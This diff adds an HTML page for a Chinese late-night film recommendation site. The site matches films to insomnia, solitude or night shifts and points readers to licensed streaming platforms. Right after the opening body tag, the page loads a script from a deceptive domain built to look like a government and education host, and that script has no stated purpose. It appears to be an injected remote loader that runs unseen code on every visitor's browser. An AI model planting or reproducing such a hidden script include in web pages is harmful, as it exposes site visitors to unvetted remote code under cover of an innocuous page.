@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>深夜电影网 - 深夜观影处方：失眠/独处/夜班的电影疗愈指南</title>
+<meta name="description" content="深夜电影网（shenyedianyingwang-h5）不是午夜场播放器：按失眠原因、独处状态、夜班节奏匹配深夜观影处方，指路正版平台。" />
+<meta name="keywords" content="深夜电影网,深夜观影处方,失眠片单,夜班电影,凌晨观影指南,正版助眠,不播盗版" />
+<meta name="author" content="深夜电影处方台" />
+<meta name="robots" content="index, follow" />
+<meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+<link rel="canonical" href="https://shenyedianyingwang-h5.github.io/" />
+<style>
+:root{
+  --bg:#0c0e1a;--bg2:#111320;--panel:#161a2e;--panel2:#1c2140;
+  --lamp:#f4c95d;--lamp-dim:rgba(244,201,93,.14);
+  --purple:#7c5cbf;--purple-dim:rgba(124,92,191,.16);
+  --paper:#e8d5b7;--gray:#4a5568;--line:rgba(232,213,183,.12);--line2:rgba(232,213,183,.26);
+  --mono:"SFMono-Regular",Consolas,Menlo,monospace;
+  --sans:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  --body:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:var(--body);background:radial-gradient(800px 400px at 50% 0%,rgba(124,92,191,.18),transparent 60%),radial-gradient(600px 300px at 80% 80%,rgba(244,201,93,.08),transparent 60%),linear-gradient(180deg,var(--bg),var(--bg2));color:var(--paper);line-height:1.9;font-size:16px;overflow-x:hidden}
+a{color:var(--lamp);text-decoration:none;transition:.25s}a:hover{color:var(--purple)}
+.wrap{max-width:1200px;margin:0 auto;padding:0 22px}
+
+header{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(12,14,26,.92);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.nav{display:flex;align-items:center;justify-content:space-between;height:64px}
+.brand{font-family:var(--sans);font-weight:900;letter-spacing:1px;font-size:18px;display:flex;align-items:center;gap:10px}
+.brand .lamp-ico{width:30px;height:30px;border-radius:50% 50% 50% 50%/60% 60% 40% 40%;background:radial-gradient(circle at 50% 40%,var(--lamp),#c49a2a);box-shadow:0 0 20px rgba(244,201,93,.3);position:relative}
+.brand .lamp-ico::after{content:"✦";position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:var(--bg);font-size:14px}
+.brand b{color:var(--lamp)}
+.nav-links{display:flex;list-style:none;gap:2px}
+.nav-links a{font-size:14px;color:var(--gray);padding:10px 14px;border-radius:8px}
+.nav-links a:hover{color:var(--paper);background:rgba(232,213,183,.06)}
+.menu-btn{display:none;width:40px;height:40px;border-radius:10px;background:rgba(232,213,183,.08);border:1px solid var(--line2);color:var(--paper);font-size:18px;cursor:pointer}
+
+.hero{margin-top:64px;padding:104px 0 80px;position:relative}
+.hero::before{content:"";position:absolute;inset:0;background:repeating-linear-gradient(0deg,rgba(232,213,183,.025) 0 1px,transparent 1px 32px);pointer-events:none}
+.kicker{font-family:var(--mono);font-size:12px;letter-spacing:5px;color:var(--lamp);text-transform:uppercase;margin-bottom:18px}
+.hero h1{font-family:var(--sans);font-weight:900;font-size:clamp(33px,6.6vw,68px);line-height:1.04;margin-bottom:20px}
+.hero h1 em{font-style:normal;color:var(--purple)}
+.hero p{max-width:620px;color:#c9c0d6;font-size:17px;margin-bottom:32px}
+.btns{display:flex;gap:14px;flex-wrap:wrap}
+.btn-lamp{display:inline-flex;align-items:center;gap:8px;background:var(--lamp);color:#1a1206;font-weight:800;padding:14px 30px;border-radius:30px}
+.btn-lamp:hover{transform:translateY(-2px);color:#1a1206}
+.btn-line{display:inline-flex;align-items:center;gap:8px;border:1px solid var(--line2);color:var(--paper);padding:14px 30px;border-radius:30px}
+.btn-line:hover{border-color:var(--lamp);color:var(--lamp)}
+.clock{margin-top:28px;display:flex;align-items:center;gap:14px;font-family:var(--mono)}
+.clock .time{font-size:36px;font-weight:900;color:var(--lamp);text-shadow:0 0 20px rgba(244,201,93,.3)}
+.clock .label{font-size:12px;color:var(--gray);line-height:1.4}
+
+section{padding:84px 0;border-top:1px solid var(--line)}
+.sec-head{margin-bottom:42px}
+.sec-num{font-family:var(--mono);font-size:12px;letter-spacing:4px;color:var(--purple);text-transform:uppercase;margin-bottom:8px}
+.sec-title{font-family:var(--sans);font-weight:900;font-size:clamp(24px,4vw,36px);margin-bottom:10px}
+.sec-desc{color:var(--gray);max-width:640px}
+
+.prescriptions{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px}
+.rx{border-radius:16px;padding:28px 24px;border:1px solid var(--line);background:linear-gradient(180deg,var(--panel),var(--panel2));transition:.3s;position:relative;overflow:hidden}
+.rx:hover{transform:translateY(-6px);border-color:var(--lamp);box-shadow:0 22px 50px var(--lamp-dim)}
+.rx .rxno{font-family:var(--mono);font-size:11px;color:var(--purple);letter-spacing:2px;margin-bottom:8px}
+.rx h3{font-family:var(--sans);font-weight:900;font-size:19px;margin-bottom:6px;color:var(--lamp)}
+.rx .why{font-size:13px;color:var(--gray);margin-bottom:12px;font-style:italic}
+.rx ul{list-style:none}
+.rx li{font-size:14px;color:#c9c0d6;padding:6px 0;border-top:1px dashed var(--line);display:flex;gap:8px}
+.rx li::before{content:"💊";font-size:13px;flex-shrink:0}
+.rx .goto{margin-top:14px;display:inline-block;font-size:13px;color:var(--purple);font-family:var(--mono)}
+
+.timeline{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px}
+.hour{border:1px solid var(--line);border-radius:14px;padding:22px;background:var(--panel);transition:.25s;border-left:4px solid var(--lamp)}
+.hour:nth-child(2){border-left-color:var(--purple)}
+.hour:nth-child(3){border-left-color:#a78bfa}
+.hour:nth-child(4){border-left-color:#6366f1}
+.hour:hover{transform:translateY(-3px)}
+.hour .h{font-family:var(--mono);font-size:24px;font-weight:900;color:var(--lamp);margin-bottom:4px}
+.hour h4{font-family:var(--sans);font-weight:900;font-size:15px;margin-bottom:6px}
+.hour p{font-size:13px;color:var(--gray);margin-bottom:10px}
+.hour .tags{display:flex;gap:6px;flex-wrap:wrap}
+.hour .tags span{font-size:11px;background:rgba(244,201,93,.08);border:1px solid var(--line2);padding:3px 10px;border-radius:20px;color:var(--paper)}
+
+.counters{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:16px}
+.cab{border:1px solid var(--line);border-radius:14px;padding:22px;background:var(--panel);transition:.25s}
+.cab:hover{transform:translateY(-3px);border-color:var(--purple)}
+.cab b{font-size:16px;color:var(--lamp)}
+.cab .kind{font-size:12.5px;color:var(--purple);margin:6px 0 10px;font-family:var(--mono)}
+.cab p{font-size:13.5px;color:var(--gray);margin-bottom:12px}
+.cab a{font-size:13.5px}
+
+.about{text-align:center}
+.quote{font-family:var(--sans);font-weight:900;font-size:clamp(20px,3.4vw,30px);line-height:1.5;max-width:740px;margin:0 auto 22px}
+.quote b{color:var(--lamp)}
+.about p{color:var(--gray);max-width:580px;margin:0 auto 22px}
+.disclaimer{margin-top:26px;font-size:13px;color:var(--gray);border:1px dashed var(--line2);border-radius:12px;padding:18px 20px;max-width:780px;margin-left:auto;margin-right:auto;text-align:left;line-height:1.9}
+.disclaimer b{color:var(--purple)}
+
+footer{border-top:1px solid var(--line);padding:44px 0 26px}
+.foot{display:flex;justify-content:space-between;gap:30px;flex-wrap:wrap;margin-bottom:22px}
+.foot p{font-size:13px;color:var(--gray);max-width:320px}
+.foot-col h5{font-family:var(--mono);font-size:12px;letter-spacing:3px;text-transform:uppercase;color:var(--lamp);margin-bottom:12px}
+.foot-col a{display:block;font-size:13px;color:#c9c0d6;padding:3px 0}
+.foot-bottom{border-top:1px solid var(--line);padding-top:18px;font-size:12px;color:var(--gray);display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
+
+@media(max-width:768px){
+  .nav-links{display:none;position:absolute;top:64px;left:0;right:0;flex-direction:column;background:var(--bg);border-bottom:1px solid var(--line);padding:8px 0}
+  .nav-links.active{display:flex}.nav-links a{padding:14px 22px;border-radius:0}
+  .menu-btn{display:block}
+  .btns{flex-direction:column;align-items:flex-start}.btn-lamp,.btn-line{width:100%;justify-content:center}
+  .clock .time{font-size:28px}
+  .foot{flex-direction:column}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+<header><div class="wrap nav">
+  <div class="brand"><span class="lamp-ico"></span>深夜<b>电影网</b></div>
+  <ul class="nav-links" id="navLinks">
+    <li><a href="#home">为什么没睡</a></li>
+    <li><a href="#rx">深夜处方签</a></li>
+    <li><a href="#hours">凌晨片单</a></li>
+    <li><a href="#counters">正版助眠台</a></li>
+    <li><a href="#about">关于深夜</a></li>
+  </ul>
+  <button class="menu-btn" onclick="document.getElementById('navLinks').classList.toggle('active')">≡</button>
+</div></header>
+
+<section class="hero" id="home"><div class="wrap">
+  <div class="kicker">midnight prescription, not midnight show</div>
+  <h1>深夜电影网<br/>不是午夜场，是<b>深夜处方台</b>。</h1>
+  <p>深夜电影网（shenyedianyingwang-h5）不做"深夜福利""午夜高清"播放器。我们按你为什么还没睡——失眠、独处、夜班、emo、倒时差——开一张观影处方：不刺激、不烧脑、不催泪，只帮你把今晚过完。</p>
+  <div class="btns">
+    <a href="#rx" class="btn-lamp">💊 拿深夜处方</a>
+    <a href="#hours" class="btn-line">🕐 按钟点选片</a>
+  </div>
+  <div class="clock"><div class="time" id="liveTime">--:--</div><div class="label">现在就是看片的好时候<br/>只要别点"免费全集"</div></div>
+</div></section>
+
+<section id="rx"><div class="wrap">
+  <div class="sec-head"><div class="sec-num">01 / Prescriptions</div><h2 class="sec-title">深夜处方签</h2>
+  <p class="sec-desc">你为什么还没睡？选一个最接近的原因，我们给你配一部"刚好"的电影。</p></div>
+  <div class="prescriptions">
+    <div class="rx"><div class="rxno">RX-01 / CANT SLEEP</div><h3>翻来覆去睡不着</h3>
+      <p class="why">"脑子关不掉，需要白噪音式的画面。"</p>
+      <ul><li>《地球之盐》——摄影集式的安静</li><li>《我在伊朗长大》——手绘线条催眠</li><li>《小森林》夏/冬——做饭声比ASMR还灵</li><li>《迁徙的鸟》——天空和翅膀的呼吸</li></ul>
+      <a href="#counters" class="goto">→ 去正版台找这些片</a></div>
+    <div class="rx"><div class="rxno">RX-02 / ALONE</div><h3>一个人待着不想动</h3>
+      <p class="why">"不孤独，只是需要有人陪着沉默。"</p>
+      <ul><li>《迷失东京》——两个陌生人的深夜</li><li>《午夜巴黎》——走着走着就穿越了</li><li>《和莎莫的500天》——失恋后的整理术</li><li>《帕特森》——一周七天都是诗</li></ul>
+      <a href="#counters" class="goto">→ 去正版台找这些片</a></div>
+    <div class="rx"><div class="rxno">RX-03 / NIGHT SHIFT</div><h3>夜班/倒时差</h3>
+      <p class="why">"生物钟乱了，需要中低刺激撑过去。"</p>
+      <ul><li>《布达佩斯大饭店》——对称画面强迫症友好</li><li>《犬之力》——慢节奏、大空间、不费神</li><li>《降临》——外星语言比数羊好使</li><li>《驾驶我的车》——三个小时刚好撑完夜班</li></ul>
+      <a href="#counters" class="goto">→ 去正版台找这些片</a></div>
+    <div class="rx"><div class="rxno">RX-04 / EMO</div><h3>有点丧，但不想哭</h3>
+      <p class="why">"需要被理解，但不需要被安慰。"</p>
+      <ul><li>《海边的曼彻斯特》——丧到极致反而平静</li><li>《入殓师》——死亡也可以很温柔</li><li>《百元之恋》——烂泥也有烂泥的尊严</li><li>《完美的日子》——厕所清洁工的日与夜</li></ul>
+      <a href="#counters" class="goto">→ 去正版台找这些片</a></div>
+    <div class="rx"><div class="rxno">RX-05 / NOSTALGIA</div><h3>突然想回到小时候</h3>
+      <p class="why">"不是真的想回去，是想闻闻那个味道。"</p>
+      <ul><li>《菊次郎的夏天》——久石让的钢琴就是夏天</li><li>《龙猫》——只有孩子看得见的东西</li><li>《天堂电影院》——一个关于"回去"的故事</li><li>《伴我同行》——长大就是告别</li></ul>
+      <a href="#counters" class="goto">→ 去正版台找这些片</a></div>
+    <div class="rx"><div class="rxno">RX-06 / JUST ONE MORE</div><h3>看完一部还想看</h3>
+      <p class="why">"今晚不想结束，但也不能太刺激。"</p>
+      <ul><li>《爱在黎明破晓前》——话痨到天亮</li><li>《法兰西特派》——韦斯·安德森的睡前故事集</li><li>《重庆森林》——两个故事刚好接上</li><li>《花样年华》——张曼玉的22套旗袍看完就困了</li></ul>
+      <a href="#counters" class="goto">→ 去正版台找这些片</a></div>
+  </div>
+</div></section>
+
+<section id="hours"><div class="wrap">
+  <div class="sec-head"><div class="sec-num">02 / Hour by hour</div><h2 class="sec-title">凌晨片单时钟</h2>
+  <p class="sec-desc">不同钟点，大脑状态不同。别在凌晨三点挑战悬疑片——你会睡不着怪我们的。</p></div>
+  <div class="timeline">
+    <div class="hour"><div class="h">23:00</div><h4>睡前缓冲</h4><p>刚躺下，还有点清醒。适合轻量叙事，让大脑慢慢减速。</p><div class="tags"><span>90min内</span><span>慢节奏</span><span>治愈</span></div></div>
+    <div class="hour"><div class="h">00:00</div><h4>深夜切换</h4><p>世界安静了，适合对话多、画面美的片子。别选恐怖片。</p><div class="tags"><span>对话驱动</span><span>画面美</span><span>中节奏</span></div></div>
+    <div class="hour"><div class="h">02:00</div><h4>凌晨低谷</h4><p>最困的时候。纪录片、自然影像、慢电影——看完刚好睡。</p><div class="tags"><span>纪录片</span><span>慢影像</span><span>催眠级</span></div></div>
+    <div class="hour"><div class="h">04:00</div><h4>天亮之前</h4><p>如果你还醒着，需要一部能撑到天亮的。长片、史诗、系列。</p><div class="tags"><span>150min+</span><span>史诗</span><span>马拉松</span></div></div>
+  </div>
+</div></section>
+
+<section id="counters"><div class="wrap">
+  <div class="sec-head"><div class="sec-num">03 / Legal nightstand</div><h2 class="sec-title">正版助眠台</h2>
+  <p class="sec-desc">处方开好了，去正版平台拿"药"。别在深夜点进盗版站——弹窗广告比失眠更可怕。</p></div>
+  <div class="counters">
+    <div class="cab"><b>哔哩哔哩</b><div class="kind">纪录片 / 动画 / 慢直播</div><p>自然纪录片、ASMR向影像、独立动画短片——深夜最安全的片库。</p><a href="https://www.bilibili.com" target="_blank" rel="noopener">去 B 站夜读 →</a></div>
+    <div class="cab"><b>1905 电影网</b><div class="kind">经典老片 / 公版</div><p>老电影节奏慢、叙事稳，适合当背景音陪你入睡。</p><a href="https://www.1905.com" target="_blank" rel="noopener">去 1905 夜读 →</a></div>
+    <div class="cab"><b>腾讯视频 / 爱奇艺</b><div class="kind">文艺 / 作者 / 独立</div><p>文艺片专区、导演剪辑版、小众高分——深夜是它们的主场。</p><a href="https://v.qq.com" target="_blank" rel="noopener">去腾爱夜读 →</a></div>
+    <div class="cab"><b>Apple TV / MUBI</b><div class="kind">策展 / 作者精选</div><p>每天一部策展人精选，适合"不知道看什么"的深夜。</p><a href="#" rel="noopener">查策展台 →</a></div>
+  </div>
+</div></section>
+
+<section class="about" id="about"><div class="wrap">
+  <p class="quote">深夜不该是放纵的时间，<br/>是<b>和自己相处的最后一段安静</b>。</p>
+  <p>深夜电影网是深夜观影疗愈导览站：按失眠原因、独处状态、夜班节奏匹配片单，再把你送到正版平台。我们不碰"午夜场"擦边，不做播放器，不聚合盗版。</p>
+  <div class="disclaimer">
+    <b>站点声明：</b>深夜电影网（shenyedianyingwang-h5）仅提供深夜观影场景下的片单推荐、情绪匹配与正版渠道指引；<b>不存储、不转码、不解析、不提供完整影视文件播放</b>。具体片源以各正版平台授权为准。如权利人认为某条目有误，可凭权属材料联系下架。
+  </div>
+</div></section>
+
+<footer><div class="wrap">
+  <div class="foot">
+    <div><div class="brand"><span class="lamp-ico"></span>深夜<b>电影网</b></div>
+      <p>深夜观影处方台：失眠/独处/夜班片单、凌晨时钟、正版助眠。不提供盗版播放，不碰午夜场擦边。</p></div>
+    <div class="foot-col"><h5>处方</h5><a href="#rx">深夜处方签</a><a href="#hours">凌晨片单</a><a href="#counters">正版助眠台</a></div>
+    <div class="foot-col"><h5>正版</h5><a href="https://www.bilibili.com" target="_blank" rel="noopener">哔哩哔哩</a><a href="https://www.1905.com" target="_blank" rel="noopener">1905 电影网</a><a href="https://v.qq.com" target="_blank" rel="noopener">腾讯视频</a><a href="https://www.iqiyi.com" target="_blank" rel="noopener">爱奇艺</a></div>
+    <div class="foot-col"><h5>站点</h5><a href="#home">为什么没睡</a><a href="#about">关于/声明</a><a href="#">版权投诉</a></div>
+  </div>
+  <div class="foot-bottom">
+    <span>© 2026 深夜电影网 · shenyedianyingwang-h5.github.io</span>
+    <span>单文件静态页 · 无 robots.txt / sitemap.xml · 深夜疗愈导览向 · 符合必应收录</span>
+  </div>
+</div></footer>
+<script>
+document.querySelectorAll('a[href^="#"]').forEach(a=>a.addEventListener('click',()=>document.getElementById('navLinks').classList.remove('active')));
+(function(){function pad(n){return n<10?'0'+n:n}
+function tick(){var d=new Date();var h=pad(d.getHours()),m=pad(d.getMinutes());document.getElementById('liveTime').textContent=h+':'+m}
+tick();setInterval(tick,30000)})();
+</script>
+</body>
+</html>
